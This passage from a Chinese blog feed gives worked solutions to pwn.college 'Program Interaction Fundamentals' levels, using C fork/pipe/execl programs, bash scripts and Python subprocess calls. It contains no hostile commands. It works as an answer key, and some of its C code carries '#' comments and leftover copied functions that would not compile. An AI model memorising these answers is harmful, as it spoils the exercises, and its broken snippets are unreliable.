s:0x5 i:0xae f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x4</span><br><span class="line">[s] STK NONE a</span><br><span class="line">[s] ... pushing a</span><br><span class="line">[V] a:0x59 b:0x3a c:0x20 d:0x5 s:0x6 i:0xaf f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x10</span><br><span class="line">[s] STK NONE b</span><br><span class="line">[s] ... pushing b</span><br><span class="line">[V] a:0x59 b:0x3a c:0x20 d:0x5 s:0x7 i:0xb0 f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x1</span><br><span class="line">[s] STK NONE c</span><br><span class="line">[s] ... pushing c</span><br><span class="line">[V] a:0x59 b:0x3a c:0x20 d:0x5 s:0x8 i:0xb1 f:0</span><br><span class="line">[I] op:0x2 arg1:0x10 arg2:0x30</span><br><span class="line">[s] IMM b = 0x30</span><br><span class="line">[V] a:0x59 b:0x30 c:0x20 d:0x5 s:0x8 i:0xb2 f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x8</span><br><span class="line">[s] IMM c = 0x8</span><br><span class="line">[V] a:0x59 b:0x30 c:0x8 d:0x5 s:0x8 i:0xb3 f:0</span><br><span class="line">[I] op:0x2 arg1:0x4 arg2:0</span><br><span class="line">[s] IMM a = 0</span><br><span class="line">[V] a:0 b:0x30 c:0x8 d:0x5 s:0x8 i:0xb4 f:0</span><br><span class="line">[I] op:0x80 arg1:0x4 arg2:0x8</span><br><span class="line">[s] SYS 0x4 d</span><br><span class="line">[s] ... read_memory</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">op:执行的指令</span><br><span class="line">arg1:第一个参数，指寄存器</span><br><span class="line">arg2:第二个参数</span><br><span class="line">a:0x1</span><br><span class="line">b:0x2</span><br><span class="line">c:0x4</span><br><span class="line">d:0x8</span><br><span class="line">s:0x10</span><br><span class="line">i:0x20</span><br><span class="line">f:0x40</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Program-Interaction-Fundamentals</title>
    <url>/2024/10/18/pwn-college-Program-Interaction-Fundamentals/</url>
    <content><![CDATA[<h1 id="level-60cat"><a href="#level-60cat" class="headerlink" title="level 60	cat"></a>level 60	cat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WELCOME! This challenge makes the following asks of you:</span><br><span class="line">- the challenge checks for a specific parent process : binary</span><br><span class="line">- the challenge checks for a specific process at the other end of stdout : cat</span><br><span class="line"></span><br><span class="line">ONWARDS TO GREATNESS!</span><br><span class="line"></span><br><span class="line">[INFO] This challenge will now perform a bunch of checks.</span><br><span class="line">[INFO] If you pass these checks, you will receive the flag.</span><br><span class="line">[TEST] Performing checks on the parent process of this process.</span><br><span class="line">[TEST] Checking to make sure that the process is a custom binary that you created by compiling a C program</span><br><span class="line">[TEST] that you wrote. Make sure your C program has a function called &#x27;pwncollege&#x27; in it --- otherwise,</span><br><span class="line">[TEST] it won&#x27;t pass the checks.</span><br><span class="line">[HINT] If this is a check for the *parent* process, keep in mind that the exec() family of system calls</span><br><span class="line">[HINT] does NOT result in a parent-child relationship. The exec()ed process simply replaces the exec()ing</span><br><span class="line">[HINT] process. Parent-child relationships are created when a process fork()s off a child-copy of itself,</span><br><span class="line">[HINT] and the child-copy can then execve() a process that will be the new child. If we&#x27;re checking for a</span><br><span class="line">[HINT] parent process, that&#x27;s how you make that relationship.</span><br><span class="line">[INFO] The executable that we are checking is: /usr/bin/bash.</span><br><span class="line">[HINT] One frequent cause of the executable unexpectedly being a shell or docker-init is that your</span><br><span class="line">[HINT] parent process terminated before this check was run. This happens when your parent process launches</span><br><span class="line">[HINT] the child but does not wait on it! Look into the waitpid() system call to wait on the child!</span><br><span class="line"></span><br><span class="line">[HINT] Another frequent cause is the use of system() or popen() to execute the challenge. Both will actually</span><br><span class="line">[HINT] execute a shell that will then execute the challenge, so the parent of the challenge will be that</span><br><span class="line">[HINT] shell, rather than your program. You must use fork() and one of the exec family of functions (execve(),</span><br><span class="line">[HINT] execl(), etc).</span><br><span class="line">[FAIL] You did not satisfy all the execution requirements.</span><br><span class="line">[FAIL] Specifically, you must fix the following issue:</span><br><span class="line">[FAIL]    The process must be your own program in your own home directory.</span><br></pre></td></tr></table></figure>

<p>程序要求我们编译一个c程序，程序内有一个pwncollege函数，同时在stdout端设置为cat进程</p>
<p>考虑创建两个子进程，一个用来运行cat，一个运行challenge，并通过dup2重定向输入输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line"></span><br><span class="line">int pwncollege()&#123;</span><br><span class="line">    char *a[]=&#123;NULL&#125;;</span><br><span class="line">    execl(&quot;/challenge/embryoio_level60&quot;,&quot;embryoio_level60&quot;,NULL);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char* argv[],char *env[])&#123;</span><br><span class="line">    int fd[2];#管道</span><br><span class="line">    </span><br><span class="line">    if( pipe(fd)==-1 )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;pipe&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    int p1=fork();#第一个子进程</span><br><span class="line">    if(p1 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">    else if(p1==0)&#123;</span><br><span class="line">        printf(&quot;in this child his pid is %d,its cat&quot;,getpid());</span><br><span class="line">        close(fd[1]);#关闭该子进程的输出管道</span><br><span class="line">        dup2(fd[0],STDIN_FILENO);#重定向输入管道为标准输入</span><br><span class="line">        if(execl(&quot;/usr/bin/cat&quot;, &quot;cat&quot;, NULL) == -1)</span><br><span class="line">        &#123; </span><br><span class="line">            perror(&quot;exec&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        int p2=fork();</span><br><span class="line">        if(p2 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">        if(p2==0)&#123;#子程序中</span><br><span class="line">            printf(&quot;in this child his pid is %d&quot;,getpid());</span><br><span class="line">            close(fd[0]);#同上</span><br><span class="line">            dup2(fd[1],STDOUT_FILENO);</span><br><span class="line">            if(execl(&quot;/challenge/embryoio_level60&quot;, &quot;embryoio_level60&quot;, NULL) == -1)</span><br><span class="line">                perror(&quot;exec&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            wait(NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/nyist327/article/details/35782015">参考链接:fork同时创建多个子进程的方法-CSDN博客</a></p>
<h1 id="level-61grep"><a href="#level-61grep" class="headerlink" title="level 61	grep"></a>level 61	grep</h1><p>和60几乎是同样, 只需要把执行的命令换成grep即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line"></span><br><span class="line">void pwncollege()&#123;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char* argv[],char *env[])&#123;</span><br><span class="line">    int fd[2];</span><br><span class="line">    </span><br><span class="line">    if( pipe(fd)==-1 )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;pipe&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    int p1=fork();</span><br><span class="line">    if(p1 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">    else if(p1==0)&#123;</span><br><span class="line">        printf(&quot;in this child his pid is %d,its cat&quot;,getpid());</span><br><span class="line">        close(fd[1]);</span><br><span class="line">        dup2(fd[0],STDIN_FILENO);</span><br><span class="line"></span><br><span class="line">        if(execl(&quot;/bin/grep&quot;, &quot;grep&quot;,&quot;pwn&quot;, NULL) == -1)</span><br><span class="line">        &#123; </span><br><span class="line">            perror(&quot;exec&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        int p2=fork();</span><br><span class="line">        if(p2 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">        if(p2==0)&#123;</span><br><span class="line">            printf(&quot;in this child his pid is %d&quot;,getpid());</span><br><span class="line">            close(fd[0]);</span><br><span class="line">            dup2(fd[1],STDOUT_FILENO);</span><br><span class="line">            if(execl(&quot;/challenge/embryoio_level61&quot;, &quot;embryoio_level61&quot;, NULL) == -1)</span><br><span class="line">                perror(&quot;exec&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            wait(NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level-62sed"><a href="#level-62sed" class="headerlink" title="level 62	sed"></a>level 62	sed</h1><p>sed命令：依照脚本的指令来处理、编辑文本文件。</p>
<p>选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br><span class="line">-e&lt;script&gt;或--expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。</span><br><span class="line">-f&lt;script文件&gt;或--file=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。</span><br><span class="line">-h或--help 显示帮助。</span><br><span class="line">-n或--quiet或--silent 仅显示script处理后的结果。</span><br><span class="line">-V或--version 显示版本信息。</span><br><span class="line">动作：</span><br><span class="line">a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</span><br><span class="line">c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</span><br><span class="line">d ：删除，因为是删除啊，所以 d 后面通常不接任何东东；</span><br><span class="line">i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</span><br><span class="line">p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</span><br><span class="line">s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正则表达式！例如 1,20s/old/new/g 就是啦！</span><br></pre></td></tr></table></figure>

<p>这里只需要打印出，所以用<strong>p</strong>即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(execl(&quot;/bin/sed&quot;, &quot;sed&quot;,&quot;p&quot;, NULL) == -1)</span><br></pre></td></tr></table></figure>

<h1 id="level-63rev"><a href="#level-63rev" class="headerlink" title="level 63	rev"></a>level 63	rev</h1><p>rev命令：将文本文件反向</p>
<p>参数为文件，</p>
<p>若无参数，则可连续多次翻转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(execl(&quot;/bin/rev&quot;, &quot;rev&quot;, NULL) == -1)</span><br></pre></td></tr></table></figure>

<h1 id="level-64-cat2"><a href="#level-64-cat2" class="headerlink" title="level 64 cat2"></a>level 64 cat2</h1><p>使标准输入端为cat</p>
<p>level60是标准输出为cat，这一个是标准输入为cat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line"></span><br><span class="line">int pwncollege()&#123;</span><br><span class="line">    char *a[]=&#123;NULL&#125;;</span><br><span class="line">    execl(&quot;/challenge/embryoio_level60&quot;,&quot;embryoio_level60&quot;,NULL);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char* argv[],char *env[])&#123;</span><br><span class="line">    int fd[2];</span><br><span class="line">    </span><br><span class="line">    if( pipe(fd)==-1 )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;pipe&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    int p1=fork();</span><br><span class="line">    if(p1 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">    else if(p1==0)&#123;</span><br><span class="line">        printf(&quot;in this child his pid is %d,its cat&quot;,getpid());</span><br><span class="line">        close(fd[0]);</span><br><span class="line">        dup2(fd[1],STDOUT_FILENO);</span><br><span class="line">        if(execl(&quot;/usr/bin/cat&quot;, &quot;cat&quot;, NULL) == -1)</span><br><span class="line">        &#123; </span><br><span class="line">            perror(&quot;exec&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        int p2=fork();</span><br><span class="line">        if(p2 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">        if(p2==0)&#123;</span><br><span class="line">            printf(&quot;in this child his pid is %d&quot;,getpid());</span><br><span class="line">            close(fd[1]);</span><br><span class="line">            dup2(fd[0],STDIN_FILENO);</span><br><span class="line">            if(execl(&quot;/challenge/embryoio_level64&quot;, &quot;embryoio_level64&quot;, NULL) == -1)</span><br><span class="line">                perror(&quot;exec&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            wait(NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level-65-rev2"><a href="#level-65-rev2" class="headerlink" title="level 65 rev2"></a>level 65 rev2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line"></span><br><span class="line">int pwncollege()&#123;</span><br><span class="line">    char *a[]=&#123;NULL&#125;;</span><br><span class="line">    execl(&quot;/challenge/embryoio_level60&quot;,&quot;embryoio_level60&quot;,NULL);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char* argv[],char *env[])&#123;</span><br><span class="line">    int fd[2];</span><br><span class="line">    </span><br><span class="line">    if( pipe(fd)==-1 )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;pipe&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    int p1=fork();</span><br><span class="line">    if(p1 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">    else if(p1==0)&#123;</span><br><span class="line">        printf(&quot;in this child his pid is %d,its cat&quot;,getpid());</span><br><span class="line">        close(fd[0]);</span><br><span class="line">        dup2(fd[1],STDOUT_FILENO);</span><br><span class="line">        if(execl(&quot;/usr/bin/rev&quot;, &quot;rev&quot;, NULL) == -1)</span><br><span class="line">        &#123; </span><br><span class="line">            perror(&quot;exec&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        int p2=fork();</span><br><span class="line">        if(p2 &lt; 0)</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">        if(p2==0)&#123;</span><br><span class="line">            printf(&quot;in this child his pid is %d&quot;,getpid());</span><br><span class="line">            close(fd[1]);</span><br><span class="line">            dup2(fd[0],STDIN_FILENO);</span><br><span class="line">            if(execl(&quot;/challenge/embryoio_level65&quot;, &quot;embryoio_level65&quot;, NULL) == -1)</span><br><span class="line">                perror(&quot;exec&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            wait(NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ctrl+d是退出rev</p>
<h1 id="level-66-find-exec"><a href="#level-66-find-exec" class="headerlink" title="level 66 find -exec"></a>level 66 find -exec</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find a -exec /challenge/embryoio_level66 \;</span><br></pre></td></tr></table></figure>

<p>利用-exec选项可执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -exec cmd arg \;   &lt;==&gt;execlp(&quot;cmd&quot;,&quot;arg&quot;)</span><br></pre></td></tr></table></figure>

<p>完整选项为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-exec xxx \;</span><br></pre></td></tr></table></figure>

<h1 id="level-67-find2"><a href="#level-67-find2" class="headerlink" title="level 67 find2"></a>level 67 find2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find a -exec /challenge/embryoio_level67 frtgaknhox \;</span><br></pre></td></tr></table></figure>

<p>只需在执行程序后加个参数</p>
<h1 id="level-68-154-parameters"><a href="#level-68-154-parameters" class="headerlink" title="level 68 154 parameters"></a>level 68 154 parameters</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">for i in &#123;0..154&#125;</span><br><span class="line">do</span><br><span class="line">    arr[i]=clyunwrgyf</span><br><span class="line">done</span><br><span class="line">/challenge/embryoio_level68 &quot;$&#123;arr[@]&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>一些sh脚本的基础语法</p>
<p>for循环的语法，以及数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if </span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line">fi</span><br><span class="line">#if else</span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">else</span><br><span class="line">    command</span><br><span class="line">fi</span><br><span class="line">#for </span><br><span class="line">for var in item1 item2 ... itemN</span><br><span class="line">do</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">done</span><br><span class="line">#while</span><br><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#访问数组方法</span><br><span class="line">$&#123;arr[i]&#125;</span><br><span class="line">$&#123;arr[@]&#125;#将每一个数组元素视为一个单词</span><br><span class="line">$&#123;arr[*]&#125;#将整个数组视为一段文字，中间用空格隔开</span><br></pre></td></tr></table></figure>

<h1 id="level-69-？"><a href="#level-69-？" class="headerlink" title="level 69 ？"></a>level 69 ？</h1><p>你问我69是什么？我也不到啊</p>
<h1 id="level-70-env"><a href="#level-70-env" class="headerlink" title="level 70 env"></a>level 70 env</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#可通过env -i 直接设定一个没有任何环境变量的bash环境</span><br><span class="line">env -i 251=ttqukdpfrk /challenge/embryoio_level70 </span><br><span class="line"># export不可以设置数字开头的环境变量</span><br></pre></td></tr></table></figure>

<h1 id="level-71-env2"><a href="#level-71-env2" class="headerlink" title="level 71 env2"></a>level 71 env2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#! /bin/bash</span><br><span class="line"></span><br><span class="line">for i in &#123;0..97&#125;</span><br><span class="line">do </span><br><span class="line">    arr[i]=awokyikdhs</span><br><span class="line">done</span><br><span class="line">env -i 204=ailxhmtkid /challenge/embryoio_level71 $&#123;arr[@]&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level-72-stdin-cd"><a href="#level-72-stdin-cd" class="headerlink" title="level 72 stdin cd"></a>level 72 stdin cd</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#! /bin/bash</span><br><span class="line">cd /tmp/rdsjif</span><br><span class="line">/challenge/embryoio_level72 &lt; abjvbe</span><br></pre></td></tr></table></figure>

<p>在sh中切换目录，使用&lt; 将挑战文件的输入重定向为abjvbe</p>
<h1 id="level-73-subshell"><a href="#level-73-subshell" class="headerlink" title="level 73 subshell"></a>level 73 subshell</h1><p>linux执行scripts有多种方式，主要区别在于是否创建subshell (子进程)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source filename == . filename</span><br><span class="line">#该种方法不创建subshell,在当前shell环境下读取并执行filename中的命令，相当于在本shell中顺序执行sh里的命令</span><br><span class="line">bash filename || ./filename</span><br><span class="line">#创建subshell,在当前bash/zsg/sh环境下再新建一个子shell并执行命令,子shell继承父shell的变量，但不能使用父shell的变量。</span><br></pre></td></tr></table></figure>

<p>子shell继承的属性有</p>
<ul>
<li>当前工作目录</li>
<li>环境变量</li>
<li>标准输入、标准输出和标准错误输出</li>
<li>所有已打开的文件标识符</li>
<li>忽略的信号</li>
</ul>
<p>还有几种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ (commond)</span><br><span class="line">在子shell中执行命令</span><br><span class="line">`commond`</span><br><span class="line">同上这里的是反单引号，不是单引号</span><br><span class="line">exec commond</span><br><span class="line">替换当前shell但没有创建一个新的进程，进程pid保持不变</span><br><span class="line">即不启动新的shell，而是替换当前shell，且忽视exec之后的命令</span><br></pre></td></tr></table></figure>



<p>在本level中，就要求运行一个子shell，这个子shell运行目标程序，但是要求子shell与父shell的路径不同</p>
<p>我们可以创建两个sh文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#shell.sh</span><br><span class="line">bash subshell.sh</span><br><span class="line"></span><br><span class="line">#subshell.sh</span><br><span class="line">cd /tmp/zcmgkx &amp;&amp; exec /challenge/embryoio_level73</span><br></pre></td></tr></table></figure>

<p>执行bash shell.sh即可(exec将子shell替换为目标进程)</p>
<p>也可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(cd /tmp/zcmgkx &amp;&amp; exec /challenge/embryoio_level73)</span><br></pre></td></tr></table></figure>

<p>直接bash xx.sh 即可</p>
<h1 id="level-74-python-args"><a href="#level-74-python-args" class="headerlink" title="level 74 python args"></a>level 74 python args</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import subprocess</span><br><span class="line">a=[&#x27;/challenge/embryoio_level74&#x27;]</span><br><span class="line">for i in range(1,190):</span><br><span class="line">    a.append(&quot;aozccxvkuv&quot;)</span><br><span class="line">p = subprocess.run(a)</span><br></pre></td></tr></table></figure>

<h1 id="level-76-python-env"><a href="#level-76-python-env" class="headerlink" title="level 76 python env"></a>level 76 python env</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import subprocess</span><br><span class="line">myenv=&#123;&quot;170&quot;:&quot;zdjxsehowi&quot;&#125;</span><br><span class="line">subprocess.run([&quot;/challenge/embryoio_level76&quot;],env=myenv)</span><br></pre></td></tr></table></figure>

<p>subprocess可以自定义env，</p>
<p>pwntools的process也可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#import subprocess</span><br><span class="line">#myenv=&#123;&quot;170&quot;:&quot;zdjxsehowi&quot;&#125;</span><br><span class="line">#subprocess.run([&quot;/challenge/embryoio_level76&quot;],env=myenv)</span><br><span class="line">from pwn import*</span><br><span class="line">r=process(&quot;/challenge/embryoio_level76&quot;,env=&#123;&quot;170&quot;:&quot;zdjxsehowi&quot;&#125;)</span><br><span class="line">print(r.recvall())</span><br></pre></td></tr></table></figure>

<h1 id="level-77-python-env-args"><a href="#level-77-python-env-args" class="headerlink" title="level 77 python env args"></a>level 77 python env args</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#import subprocess</span><br><span class="line">#myenv=&#123;&quot;170&quot;:&quot;zdjxsehowi&quot;&#125;</span><br><span class="line">#subprocess.run([&quot;/challenge/embryoio_level76&quot;],env=myenv)</span><br><span class="line">a=[&quot;/challenge/embryoio_level77&quot;]</span><br><span class="line">for i in range(40):</span><br><span class="line">    a.append(&quot;xhgzegeywm&quot;)</span><br><span class="line">from pwn import*</span><br><span class="line">r=process(argv=a,env=&#123;&quot;185&quot;:&quot;pfqthebkev&quot;&#125;)</span><br><span class="line">print(r.recvall())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import subprocess</span><br><span class="line">a=[&quot;/challenge/embryoio_level77&quot;]</span><br><span class="line">for i in range(40):</span><br><span class="line">    a.append(&quot;xhgzegeywm&quot;)</span><br><span class="line"></span><br><span class="line">myenv=&#123;&quot;185&quot;:&quot;pfqthebkev&quot;&#125;</span><br><span class="line">subprocess.run(args=a,env=myenv)</span><br></pre></td></tr></table></figure>

<h1 id="level-78-python-stdin-path"><a href="#level-78-python-stdin-path" class="headerlink" title="level 78 python stdin path"></a>level 78 python stdin path</h1><p>挑战要求我们在特定路径执行，且从特定文件输入</p>
<p>利用os模块可对文件夹和文件操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">from pathlib import Path</span><br><span class="line">folder_path =Path(&quot;/tmp/xuutqa&quot;)</span><br><span class="line">if not folder_path.is_dir():</span><br><span class="line">    os.mkdir(folder_path)</span><br><span class="line">file_path=Path(&quot;yjetqu&quot;)</span><br><span class="line">if not file_path.is_file():</span><br><span class="line">    os.mknod(file_path)</span><br><span class="line"></span><br><span class="line">path=&quot;/tmp/xuutqa&quot;</span><br><span class="line">#if not os.path.isdir(path):#检测目录是否存在</span><br><span class="line">#    os.mkdir(path)#创建目录</span><br><span class="line">os.chdir(path)#切换目录</span><br><span class="line">#file_p=&quot;yjetqu&quot;</span><br><span class="line">#if not os.path.isfile(file_p):#os.path.isfile()检测文件是否存在</span><br><span class="line">#    os.mknod(file_p)#mknod创建空文件</span><br><span class="line"></span><br><span class="line">with open(&quot;yjetqu&quot;, &quot;r&quot;) as file:</span><br><span class="line">    # 将文件对象传递给 subprocess.run 作为标准输入</span><br><span class="line">    subprocess.run([&quot;/challenge/embryoio_level78&quot;], stdin=file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以利用pathlib模块来进行创建目录&#x2F;文件</p>
<h1 id="level-79-python-subshell"><a href="#level-79-python-subshell" class="headerlink" title="level 79 python subshell"></a>level 79 python subshell</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call(&quot;cd /tmp/djrooe&amp;&amp;exec /challenge/embryoio_level79&quot;,shell=True)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call用于启动一个命令，如果shell=True就是启动一个shell，并在里面执行该命令</span><br></pre></td></tr></table></figure>

<h1 id="level-119"><a href="#level-119" class="headerlink" title="level 119"></a>level 119</h1><p>本关要求stdin从fifo重定向，stdout重定向到fifo，并给出一系列算术问题，需要进行解决</p>
<p>只需要通过两个fifo管道连接父子进程，再通过另一个终端，将算术结果传输给子程序用于输入的fifo管道即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void pwncollege(char *argv[], char *env[]) &#123;</span><br><span class="line">    int fd = open(&quot;/tmp/fifo&quot;, O_RDONLY);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open /tmp/fifo&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int fd2 = open(&quot;/tmp/fifo2&quot;, O_WRONLY);</span><br><span class="line">    if (fd2 &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open /tmp/fifo2&quot;);</span><br><span class="line">        close(fd);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span 